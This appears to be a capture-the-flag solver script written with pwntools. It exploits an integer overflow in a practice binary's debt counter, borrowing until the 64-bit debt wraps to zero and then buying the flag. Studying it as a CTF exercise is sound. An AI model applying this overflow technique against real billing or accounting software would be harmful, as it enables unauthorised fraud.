from pwn import *

p = process('./main')

# Make debt by 1 point and buy flag(half)
# The result is we have debt 1 point and
# 0 point left
p.recvuntil(b"Select your choice: ")
p.sendline(b"3")
p.recvuntil(b"each time) : ")
p.sendline(b"1")
p.recvuntil(b"Select your choice: ")
p.sendline(b"1")
p.recvuntil(b"choice: ")
p.sendline(b"2")



# Borrow the money and do integer overflow
# we want to borrow 0xffffffffffffffff more
# so we'll have 0xffffffffffffffff point and
# 0x1 0000000000000000 debt which it's overflowed
# and it'll become 0x0000000000000000 or 0 debt
#
# And instead of sending and receiving data each
# time (which waste lots of time), we can send the 
# whole buffer so the program can process once.

max_borrow = 20000000000000000
goal = 2**(8*8)-1

payload = (b'3\n'+b'20000000000000000\n')*(goal//max_borrow)\
        + (b'3\n' + bytes(str(goal%max_borrow), 'ascii') + b'\n')


# Add payload to select option 1 (buy flag) and then
# again option 1 (buy whole flag)
payload += b"1\n"
payload += b"1\n"

print("Sending payload")
p.recvuntil(b"choice: ")
p.send(payload)

# Retrieve flag
p.recvuntil(b'flag{')
flag = p.recvuntil(b'}')
flag = b'flag{' + flag + b'}'
print(flag.decode())

p.close()

### Reminder ###
# If you use this script on the provided binary
# you will get the real flag. The real one is on
# the server. This is for preventing everyone to
# get buy reverse engineering the binary.
